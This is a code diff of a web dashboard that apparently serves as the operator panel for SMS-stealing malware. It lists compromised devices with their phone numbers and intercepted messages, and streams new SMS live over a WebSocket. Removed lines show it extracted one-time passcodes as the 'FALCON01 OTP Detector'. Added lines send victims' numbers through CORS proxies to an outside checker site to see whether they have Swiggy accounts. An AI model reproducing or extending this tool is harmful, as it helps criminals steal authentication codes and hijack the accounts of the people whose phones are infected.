+                setCache(devices); cacheInfo.textContent = '💾 Saved'; cacheInfo.style.color = '#58a6ff';
+                applyFiltersAndRender(); updateStats(); isFirstLoad = false;
+            } catch (err) { console.error(err); showToast('❌ Error: ' + err.message); }
+            finally { isLoading = false; refreshBtn.disabled = false; refreshBtn.classList.remove('spinning'); loading.style.display = 'none'; grid.style.display = 'grid'; }
         }
 
-        // ============================================================
-        // FILTERS & SORTING
-        // ============================================================
         function applyFiltersAndRender() {
             const search = searchInput.value.toLowerCase().trim();
             const sort = sortSelect.value;
-            const otpFilterVal = otpFilter.value;
-
             filteredDevices = devices.filter(dev => {
-                // Search filter
-                if (search) {
-                    const model = (dev.data.deviceInfo?.model || '').toLowerCase();
-                    const brand = (dev.data.deviceInfo?.brand || '').toLowerCase();
-                    const numbers = dev.numbers.join(' ').toLowerCase();
-                    const id = dev.id.toLowerCase();
-                    const match = model.includes(search) || brand.includes(search) || 
-                                  numbers.includes(search) || id.includes(search);
-                    if (!match) return false;
-                }
-
-                // OTP filter
-                if (otpFilterVal === 'hasOtp') return dev.hasOtp;
-                if (otpFilterVal === 'noOtp') return !dev.hasOtp;
-
-                return true;
+                if (!search) return true;
+                return (dev.data.deviceInfo?.model || '').toLowerCase().includes(search) || (dev.data.deviceInfo?.brand || '').toLowerCase().includes(search) || dev.numbers.join(' ').toLowerCase().includes(search) || dev.id.toLowerCase().includes(search);
             });
-
             filteredDevices.sort((a, b) => {
-                switch (sort) {
-                    case 'newest':
-                        return (b.data.userCreated || 0) - (a.data.userCreated || 0);
-                    case 'oldest':
-                        return (a.data.userCreated || 0) - (b.data.userCreated || 0);
-                    case 'mostSms':
-                        return b.msgCount - a.msgCount;
-                    case 'mostOtp':
-                        return b.otpData.uniqueCount - a.otpData.uniqueCount;
-                    default:
-                        return 0;
-                }
+                if (sort === 'newest') return (b.data.userCreated || 0) - (a.data.userCreated || 0);
+                if (sort === 'oldest') return (a.data.userCreated || 0) - (b.data.userCreated || 0);
+                if (sort === 'mostSms') return b.msgCount - a.msgCount;
+                if (sort === 'leastSms') return a.msgCount - b.msgCount;
+                return 0;
             });
-
             renderList();
         }
 
-        // ============================================================
-        // RENDER LIST
-        // ============================================================
         function renderList() {
-            if (filteredDevices.length === 0) {
-                grid.style.display = 'none';
-                noData.style.display = 'block';
-                return;
-            }
-
-            grid.style.display = 'grid';
-            noData.style.display = 'none';
-
+            if (filteredDevices.length === 0) { grid.style.display = 'none'; noData.style.display = 'block'; return; }
+            grid.style.display = 'grid'; noData.style.display = 'none';
             const fragment = document.createDocumentFragment();
-
             for (const dev of filteredDevices) {
                 const info = dev.data.deviceInfo || {};
-                const model = info.model || 'Unknown';
-                const brand = info.brand || info.manufacturer || '';
-                const numbers = dev.numbers;
-                const msgCount = dev.msgCount;
                 const status = dev.data.online ? 'online' : 'offline';
                 const recentMsgs = dev.recentMessages || [];
-                const hasRecent = recentMsgs.length > 0;
-                const otpData = dev.otpData || { uniqueCount: 0, latestOtp: null };
-                const hasOtp = dev.hasOtp;
+                const statusSwiggy = swiggyStatusMap[dev.id] || null;
+                let swiggyHtml = '';
+                if (statusSwiggy === 'registered') swiggyHtml = `<span class="swiggy-status registered">✅ Swiggy</span>`;
+                else if (statusSwiggy === 'not-registered') swiggyHtml = `<span class="swiggy-status not-registered">❌ Swiggy</span>`;
+                else if (statusSwiggy === 'checking') swiggyHtml = `<span class="swiggy-status checking">⏳ Checking...</span>`;
 
                 const card = document.createElement('div');
                 card.className = 'device-card';
-                card.setAttribute('data-deviceid', dev.id);
-
-                let otpHtml = '';
-                if (hasOtp && otpData.latestOtp) {
-                    otpHtml = `
-                        <div class="otp-highlight">
-                            <div>
-                                <span class="code">${otpData.latestOtp.code}</span>
-                                <span class="from">from ${escapeHtml(otpData.latestOtp.sender)}</span>
-                            </div>
-                            <span class="time">${formatTime(otpData.latestOtp.timestamp)}</span>
-                        </div>
-                    `;
-                }
-
-                const numbersHtml = numbers.map(n => `
-                    <span class="device-number">
-                        ${n}
-                        ${hasOtp ? '<span class="otp-badge">OTP</span>' : ''}
-                    </span>
-                `).join('') || '<span style="color:#8b949e;font-size:11px;">No numbers</span>';
-
                 card.innerHTML = `
-                    <div class="device-top">
-                        <span class="device-id">${dev.id.slice(0, 14)}${dev.id.length > 14 ? '…' : ''}</span>
-                        <span class="device-status ${status}">${status === 'online' ? '● Online' : '○ Offline'}</span>
-                    </div>
-                    <div class="device-model">${escapeHtml(model)}</div>
-                    <div class="device-brand">${escapeHtml(brand)}</div>
-                    <div class="device-numbers">${numbersHtml}</div>
-                    <div class="device-stats">
-                        <span>💬 <span class="count">${msgCount}</span></span>
-                        ${hasOtp ? `<span>🔐 <span class="otp-count">${otpData.uniqueCount}</span></span>` : ''}
-                        ${hasRecent ? `<span>📨 ${formatTimestamp(recentMsgs[0].timestamp)}</span>` : ''}
-                    </div>
-                    ${otpHtml}
+                    <div class="device-top"><span class="device-id">${dev.id.slice(0, 14)}…</span><span class="device-status ${status}">${status === 'online' ? '● Online' : '○ Offline'}</span></div>
+                    <div class="device-model">${escapeHtml(info.model || 'Unknown')}</div>
+                    <div class="device-brand">${escapeHtml(info.brand || info.manufacturer || '')}</div>
+                    <div class="device-numbers">${dev.numbers.map(n => `<span class="device-number">${n}</span>`).join('')}</div>
+                    <div class="device-stats"><span>💬 <span class="count">${dev.msgCount}</span></span>${swiggyHtml}</div>
+                    ${recentMsgs.length > 0 ? `<div style="margin-top:8px;padding-top:8px;border-top:1px solid #21262d;font-size:11px;color:#8b949e;"><div style="font-weight:500;margin-bottom:4px;">Latest: ${escapeHtml(recentMsgs[0].sender || 'Unknown')}</div><div style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${escapeHtml(recentMsgs[0].message || '').substring(0, 60)}…</div></div>` : ''}
                 `;
-
-                card.addEventListener('click', () => {
-                    window.location.href = `device-sms.html?id=${dev.id}`;
-                });
-
+                card.addEventListener('click', (e) => { if (!e.target.classList.contains('swiggy-status')) window.location.href = `device-sms.html?id=${dev.id}`; });
                 fragment.appendChild(card);
             }
-
-            grid.innerHTML = '';
-            grid.appendChild(fragment);
-
+            grid.innerHTML = ''; grid.appendChild(fragment);
             deviceCount.textContent = filteredDevices.length;
         }
 
-        // ============================================================
-        // UPDATE STATS
-        // ============================================================
         function updateStats() {
-            const totalDevices = devices.length;
             const totalSms = devices.reduce((sum, d) => sum + d.msgCount, 0);
-            const totalOtp = devices.reduce((sum, d) => sum + (d.otpData?.uniqueCount || 0), 0);
             const uniqueNumbers = new Set();
             devices.forEach(d => d.numbers.forEach(n => uniqueNumbers.add(n)));
-
-            statDevices.textContent = totalDevices;
-            statSms.textContent = totalSms;
-            statOtp.textContent = totalOtp;
-            statNumbers.textContent = uniqueNumbers.size;
+            statDevices.textContent = devices.length; statSms.textContent = totalSms; statNumbers.textContent = uniqueNumbers.size;
             statLastUpdate.textContent = lastUpdate ? formatTimestamp(lastUpdate) : '—';
-            totalSmsCount.textContent = totalSms;
-            totalOtpCount.textContent = totalOtp;
-            deviceCount.textContent = totalDevices;
+            totalSmsCount.textContent = totalSms; deviceCount.textContent = devices.length;
         }
 
-        // ============================================================
-        // EVENT LISTENERS
-        // ============================================================
+        async function fetchWithProxy(url) {
+            if (!PROXY_CONFIG.useProxy) return fetch(url);
+            const corsProxies = [`https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`, `https://corsproxy.io/?${encodeURIComponent(url)}`];
+            for (const proxy of corsProxies) { try { const response = await fetch(proxy); if (response.ok) return response; } catch (e) {} }
+            return fetch(url);
+        }
+
+        async function checkSwiggyNumber(number) {
+            try {
+                const url = `https://acczone.xyz/checker/swiggy.php?number=${encodeURIComponent(number)}`;
+                const response = await fetchWithProxy(url); const text = await response.text();
+                if (text.includes('registered') && !text.includes('not-registered')) return 'registered';
+                if (text.includes('not-registered') || text.toLowerCase().includes('not registered')) return 'not-registered';
+                return text.includes('Number is registered') ? 'registered' : 'not-registered';
+            } catch (e) { return 'error'; }
+        }
+
+        async function startSwiggyCheck() {
+            if (isCheckingSwiggy) return;
+            const btn = $('#checkSwiggyBtn'); const progressContainer = $('#progressContainer');
+            const progressFill = $('#progressFillMini'); const progressText = $('#progressTextMini');
+            const checkQueue = [];
+            devices.forEach(d => { if (d.numbers.length > 0) checkQueue.push({ id: d.id, number: d.numbers[0], name: d.data.deviceInfo?.model || 'Unknown' }); });
+            if (checkQueue.length === 0) { alert('No valid numbers discovered to inspect.'); return; }
+            isCheckingSwiggy = true; btn.disabled = true; btn.textContent = '⏳ Verifying...'; progressContainer.classList.add('active');
+            for (let i = 0; i < checkQueue.length; i++) {
+                const item = checkQueue[i]; swiggyStatusMap[item.id] = 'checking'; applyFiltersAndRender();
+                progressFill.style.width = `${((i + 1) / checkQueue.length) * 100}%`; progressText.textContent = `${i + 1}/${checkQueue.length} (${item.name})`;
+                swiggyStatusMap[item.id] = await checkSwiggyNumber(item.number); applyFiltersAndRender();
+                await new Promise(r => setTimeout(r, 150));
+            }
+            btn.disabled = false; btn.textContent = '🔍 Check Swiggy';
+            setTimeout(() => progressContainer.classList.remove('active'), 3000); isCheckingSwiggy = false;
+        }
+
+        function connectWebSocket() {
+            if (ws?.readyState === WebSocket.OPEN || ws?.readyState === WebSocket.CONNECTING) return;
+            try {
+                ws = new WebSocket(WS_URL);
+                ws.onopen = () => { wsStatus.textContent = '🟢 Live'; wsStatus.className = 'ws-status online'; };
+                ws.onmessage = (e) => { try { const p = JSON.parse(e.data); if (p?.deviceId && p?.sms) handleNewSms(p.deviceId, p.sms); } catch (err) {} };
+                ws.onclose = () => { wsStatus.textContent = '🔴 Offline'; wsStatus.className = 'ws-status offline'; setTimeout(connectWebSocket, 3000); };
+            } catch (e) { setTimeout(connectWebSocket, 3000); }
+        }
+
+        function handleNewSms(deviceId, smsData) {
+            const dev = devices.find(d => d.id === deviceId); if (!dev) return;
+            if (!dev.data.receivedSms) dev.data.receivedSms = {};
+            dev.data.receivedSms['ws_' + Date.now()] = { sender: smsData.sender || 'Unknown', message: smsData.message || '', timestamp: smsData.timestamp || Date.now() };
+            dev.msgCount = getMessageCount(dev.data); dev.recentMessages = getLastMessages(dev.data);
+            applyFiltersAndRender(); updateStats(); setCache(devices); showToast(`📩 SMS: ${smsData.sender || 'Unknown'}`);
+        }
+
         searchInput.addEventListener('input', () => applyFiltersAndRender());
         sortSelect.addEventListener('change', () => applyFiltersAndRender());
-        otpFilter.addEventListener('change', () => applyFiltersAndRender());
-
-        refreshBtn.addEventListener('click', () => {
-            fetchData(true);
-        });
-
-        // ============================================================
-        // BACKGROUND REFRESH
-        // ============================================================
-        setInterval(() => {
-            if (!document.hidden) {
-                fetchData(true);
-            }
-        }, 30000);
-
-        // ============================================================
-        // INIT
-        // ============================================================
-        const cached = getCache();
-        if (cached && cached.length > 0) {
-            devices = cached;
-            applyFiltersAndRender();
-            updateStats();
-            isFirstLoad = false;
-        }
-
-        fetchData();
-
-        console.log('⚡ FALCON01 OTP Detector loaded');
-        console.log(`📱 ${devices.length} devices loaded`);
-        console.log(`🔐 OTP detection active with ${OTP_PATTERNS.length} patterns`);
+        refreshBtn.addEventListener('click', () => fetchData(true));
+        fetchData().then(() => connectWebSocket());
     </script>
 </body>
 </html>
